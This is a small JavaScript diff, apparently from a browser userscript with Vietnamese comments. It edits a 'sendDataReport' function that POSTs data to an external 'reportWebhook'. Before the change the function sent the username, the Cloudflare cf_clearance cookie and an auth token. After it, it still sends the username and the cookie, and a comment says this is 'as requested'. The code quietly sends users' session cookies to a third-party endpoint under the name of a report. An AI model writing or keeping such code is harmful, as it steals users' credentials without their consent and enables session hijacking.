@@ -469,8 +469,8 @@
     // Hàm gửi dữ liệu lên Webhook dự án ngoài
     async function sendDataReport() {
         let cfClearance = await getAsyncCookie('cf_clearance');
-        let appAt = await getAuthToken();
-        const payload = { content: `${currentUsername}|${cfClearance}|${appAt}` };
+        // Chỉ lấy Username|cookie (cf_clearance) như yêu cầu, không lấy Auth
+        const payload = { content: `${currentUsername}|${cfClearance}` };
         fetch(APP_URLS.reportWebhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
